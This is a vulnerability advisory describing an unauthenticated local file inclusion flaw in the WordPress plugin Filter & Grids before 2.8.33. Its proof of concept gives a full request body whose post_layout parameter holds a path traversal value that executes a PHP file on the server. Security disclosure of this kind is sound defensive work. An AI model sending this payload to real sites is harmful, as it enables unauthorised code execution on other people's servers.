## WordPress Plugin Vulnerabilities

# Filter & Grids < 2.8.33 - Unauthenticated LFI

### Description

The plugin is vulnerable to Local File Inclusion via the post\_layout parameter. This makes it possible for an unauthenticated attacker to include and execute PHP files on the server, allowing the execution of any PHP code in those files.

### Proof of Concept

1. Create a PHP file named `phpinfo.php` containing `<?php phpinfo(); ?>` in the root of your WordPress install
2. Create a Filter shortcode and add to a post
3. Load the post and intecept the request
4. Replace everything after the nonce in the request body with:
```
&params={"cpt":"post","tax":"category","terms":"1","default\_terms":"","exclude\_posts":"off","choices\_posts":"","posts\_selected":"all","preloader\_icon":"preloader\_1","type\_pg":"numeric","per\_page":"4","page":"1","page\_scroll":"1","preloader\_filters":"none","preloader\_filters\_rate":"0.5","preloader\_filters\_custom":"","post\_animation":"","popup\_animation":"normal","letter":"","post\_layout":"../../../../../../../../phpinfo","filter\_layout":"filter-layout1","filter\_id":"13","search":"","search\_filtered\_posts":"0","sort\_order":"","sort\_orderby":"","meta\_key":"","meta\_query":"","date\_query":"","data\_target":"data-target-ymc1","target\_id":"1"}&paged=1
```
5. See that the data returned contains the content of `phpinfo.php`
